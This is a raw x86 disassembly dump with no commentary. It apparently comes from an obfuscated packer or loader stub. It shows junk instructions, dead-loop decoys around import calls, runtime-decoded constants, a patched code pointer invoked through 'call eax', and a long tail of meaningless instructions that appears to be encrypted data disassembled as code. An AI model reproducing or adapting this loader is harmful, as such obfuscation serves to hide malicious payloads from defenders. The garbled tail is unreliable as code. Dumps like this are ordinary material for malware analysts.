  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x430004,0x42f020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x431010,0x432004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x42f008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x432010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x42f018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x430010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x42f008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x431008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x42f020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x430000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x430000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x430000,edx
  40b298:	cmp    DWORD PTR ds:0x430000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x42465e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42b04c
  40b2c5:	cmp    DWORD PTR ds:0x430000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x430000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x430000,edx
  40b2e1:	cmp    DWORD PTR ds:0x430000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x43000c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41e2ac
  40b2fe:	or     DWORD PTR ds:0x432000,0x431018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x42f014,0x43201c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x42f010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41e330
  40b34b:	mov    esi,DWORD PTR ds:0x41e328
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41e328,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41e328
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41e328
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41e328
  40b3aa:	mov    ds:0x41e330,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x432004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x432004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x432004,ecx
  40b3db:	cmp    DWORD PTR ds:0x432004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x432004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x4246b1
  40b3fa:	push   0x42469b
  40b3ff:	call   DWORD PTR ds:0x42b050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x43201c
  40b411:	sub    DWORD PTR ds:0x42f014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x432004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x432004
  40b42f:	inc    eax
  40b430:	mov    ds:0x432004,eax
  40b435:	cmp    DWORD PTR ds:0x432004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x432004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x42b054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41e2ac
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x42f018
  40b474:	mov    eax,ds:0x41e3b8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x43000c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x43301c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x43200c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x431008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41e0cc
  40b4c0:	mov    esi,DWORD PTR ds:0x41e0e8
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x430008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x432018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x432008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42473f
  40b51b:	mov    esi,DWORD PTR ds:0x41e0e4
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x432018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x424727
  40b559:	mov    ecx,DWORD PTR ds:0x41e0b0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x431010,0x1f
  40b571:	cmp    DWORD PTR ds:0x431010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x431010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x42f000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x42b058
  40b59b:	mov    edi,DWORD PTR ds:0x431010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x431010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x43300c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x430010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x43200c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x431018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42f00c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x42f018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x43100c,0x433008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x43301c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x433004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x432018,0x433014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x42f024,0x42f00c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x42f020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x42f010,0x42f028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x431008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x43201c,0x432004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x43100c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x42f010,0x430010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x433014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41e128
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41e384
  40b774:	push   DWORD PTR ds:0x41e130
  40b77a:	push   DWORD PTR ds:0x41e364
  40b780:	push   DWORD PTR ds:0x41e3d8
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41e328
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x430000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x431010,0x430000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x431010,0x431014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x42f000,0x422
  40b80d:	mov    eax,ds:0x41e124
  40b812:	mov    edx,DWORD PTR ds:0x41e0b0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x430000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x42f008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x430004,0x10
  40b83b:	cmp    DWORD PTR ds:0x430004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x430004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x42b014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x430004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x430004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x433004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x433004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x433004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x43301c
  40b8aa:	push   0x433000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42b05c
  40b8b8:	mov    edx,DWORD PTR ds:0x433004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x433004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41e2ac
  40b8cf:	add    DWORD PTR ds:0x430018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x432000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x432000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x432000,edx
  40b8fb:	cmp    DWORD PTR ds:0x432000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x432000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x42b018
  40b920:	cmp    DWORD PTR ds:0x432000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x432000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x432000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x43200c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41e0fc
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x430010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x431014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x431018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x433008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x431004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x43100c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x431008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x433004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x42f020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x42f020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x42f004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x42f004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x42f004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42b01c
  40ba30:	cmp    DWORD PTR ds:0x42f004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x42f004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x42f004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x42f004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x42f004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x43201c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42f01c,0x430004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x433004,0x43001c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x431014,0x432018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x433014,0x42f00c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0x2b1ef842
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x3a]
  40bac3:	fucomp st(2)
  40bac5:	or     ah,BYTE PTR [edx-0x6b543641]
  40bacb:	xor    DWORD PTR [eax*8-0x7cf787f4],ebx
  40bad2:	cmp    ecx,edx
  40bad4:	cwde   
  40bad5:	sub    DWORD PTR [ebx-0x7b],esp
  40bad8:	loop   0x40bade
  40bada:	je     0x40bb39
  40badc:	(bad)  
  40bade:	imul   edi,DWORD PTR [edi-0x25c6fb50],0x5e09dc7c
  40bae8:	or     ebp,esi
  40baea:	mov    al,ds:0x3e326020
  40baef:	cmp    bh,BYTE PTR [ebx+ebp*4]
  40baf2:	call   0x6c00:0x5de50006
  40baf9:	loopne 0x40bb10
  40bafb:	push   esi
  40bafc:	mov    eax,ds:0x146993be
  40bb01:	lock and edx,DWORD PTR [eax+0x63036de2]
  40bb08:	cdq    
  40bb09:	jns    0x40bb21
  40bb0b:	fwait
  40bb0c:	mov    ah,0xed
  40bb0e:	inc    edx
  40bb0f:	xchg   ecx,eax
  40bb10:	lock test DWORD PTR [edi-0x17246f68],esp
  40bb17:	ja     0x40baef
  40bb19:	enter  0x4690,0xaf
  40bb1d:	into   
  40bb1e:	jecxz  0x40baff
  40bb20:	pop    esi
  40bb21:	iret   
  40bb22:	inc    edx
  40bb23:	into   
  40bb24:	test   al,0xcd
  40bb26:	xchg   esi,eax
  40bb27:	mov    eax,0x1a01a6cb
  40bb2c:	mov    edi,0x8c7bbb20
  40bb31:	aad    0xf7
  40bb33:	push   esp
  40bb34:	sub    BYTE PTR [ecx],cl
  40bb36:	xor    cl,BYTE PTR [edx]
  40bb38:	cli    
  40bb39:	rcr    DWORD PTR [edx-0x689ad2d8],0xbf
  40bb40:	jne    0x40bb09
  40bb42:	cmp    ebx,esp
  40bb44:	and    DWORD PTR [ecx+0x39],eax
  40bb47:	jl     0x40bb5b
  40bb49:	popf   
  40bb4a:	or     dh,BYTE PTR [edi+0x6a]
  40bb4d:	adc    eax,0x47f02b6
  40bb52:	mov    eax,0xd266bde5
  40bb57:	dec    ecx
  40bb58:	sbb    BYTE PTR [ebx],cl
  40bb5a:	xlat   BYTE PTR ds:[ebx]
  40bb5b:	mov    al,ds:0xa9ea49ab
  40bb60:	cmp    ebp,DWORD PTR [edi+0x56af5a3]
  40bb66:	out    dx,al
  40bb67:	in     eax,0xc4
  40bb69:	push   0xffffffc1
  40bb6b:	mov    al,0x22
  40bb6d:	jle    0x40bb88
  40bb6f:	mov    bl,0x79
  40bb71:	hlt    
  40bb72:	leave  
  40bb73:	sub    BYTE PTR [edx+0x7f84e971],dl
  40bb79:	into   
  40bb7a:	pop    es
  40bb7b:	and    al,0xa0
  40bb7d:	inc    edx
  40bb7e:	dec    ebp
  40bb7f:	test   DWORD PTR [ebx-0x621519ab],edx
  40bb85:	adc    ch,0xcd
  40bb88:	push   cs
  40bb89:	(bad)  
  40bb8a:	lods   eax,DWORD PTR ds:[esi]
  40bb8b:	xchg   DWORD PTR [eax+0x6a],esi
  40bb8e:	mov    cl,0x2d
  40bb90:	sbb    al,0xb0
  40bb92:	neg    DWORD PTR [ebp+0xbdb7a3]
  40bb98:	mov    BYTE PTR [ebp+0x21],ah
  40bb9b:	or     ebx,edx
  40bb9d:	cli    
  40bb9e:	or     BYTE PTR [edx+0x209e675],0xd0
  40bba5:	xchg   ebx,eax
  40bba6:	lahf   
  40bba7:	mov    al,0xae
  40bba9:	mov    ecx,0xab54fd8d
  40bbae:	aaa    
  40bbaf:	das    
  40bbb0:	and    eax,0x61dccd83
  40bbb5:	loope  0x40bb41
  40bbb7:	adc    dh,BYTE PTR [eax+0x53]
  40bbba:	mov    al,0xb3
  40bbbc:	inc    ecx
  40bbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbbe:	lods   al,BYTE PTR ds:[esi]
  40bbbf:	not    DWORD PTR [esp+edi*2]
  40bbc2:	arpl   bp,cx
  40bbc4:	enter  0x2957,0xeb
  40bbc8:	lds    esp,FWORD PTR [esi+0x571e9007]
  40bbce:	adc    al,0xe4
  40bbd0:	pop    ecx
  40bbd1:	mov    edx,0xefc837fb
  40bbd6:	lahf   
  40bbd7:	sbb    ah,0x7f
  40bbda:	popf   
  40bbdb:	mov    esp,0xb3be37c2
  40bbe0:	sbb    eax,0x5d22e50
  40bbe5:	mov    al,0xa6
  40bbe7:	sahf   
  40bbe8:	ficom  DWORD PTR [edi+0x595dba41]
  40bbee:	scas   eax,DWORD PTR es:[edi]
  40bbef:	xchg   BYTE PTR [edx+0x47fc27e0],ah
  40bbf5:	lea    esp,[edi+eiz*2+0x66]
  40bbf9:	icebp  
  40bbfa:	(bad)  
  40bbfb:	push   ss
  40bbfc:	cwde   
  40bbfd:	and    DWORD PTR [edi-0xe],eax
  40bc00:	mov    ds:0xcd8af0b4,al
  40bc05:	and    dh,ch
  40bc07:	lods   eax,DWORD PTR ds:[esi]
  40bc08:	or     BYTE PTR [ebx+0x24225b66],0x6d
  40bc0f:	iret   
  40bc10:	(bad)  
  40bc11:	stos   BYTE PTR es:[edi],al
  40bc12:	nop
  40bc13:	sbb    BYTE PTR [ecx],cl
  40bc15:	add    DWORD PTR [esi+edi*1+0xc],eax
  40bc19:	sub    BYTE PTR [edx-0x39f5760d],ah
  40bc1f:	das    
  40bc20:	ja     0x40bbc5
  40bc22:	push   ss
  40bc23:	xchg   edx,eax
  40bc24:	je     0x40bbe2
  40bc26:	or     al,0xae
  40bc28:	sub    eax,0x79f8b1f3
  40bc2d:	jmp    0xcc4a:0xd0cc20ad
  40bc34:	jl     0x40bc0d
  40bc36:	aas    
  40bc37:	ror    DWORD PTR [ebp+edi*2-0x16],0xb0
  40bc3c:	add    BYTE PTR [ebx],dh
  40bc3e:	stos   BYTE PTR es:[edi],al
  40bc3f:	cs push edi
  40bc41:	pushf  
  40bc42:	shr    dh,0xf1
  40bc45:	in     eax,dx
  40bc46:	cli    
  40bc47:	adc    ah,BYTE PTR [ebx+edi*2-0x80]
  40bc4b:	xor    edi,DWORD PTR [ebx]
  40bc4d:	push   ebx
  40bc4e:	adc    DWORD PTR [esi],ebx
  40bc50:	inc    edx
  40bc51:	(bad)  
  40bc52:	dec    ebp
  40bc53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc54:	add    al,0x10
  40bc56:	cwde   
  40bc57:	rcr    BYTE PTR [edx],0xea
  40bc5a:	sbb    ah,bh
  40bc5c:	pushf  
  40bc5d:	cmp    al,0xb2
  40bc5f:	dec    eax
  40bc60:	fs and ebp,ecx
  40bc63:	sub    al,0x12
  40bc65:	rcl    BYTE PTR [esi+0x1d],1
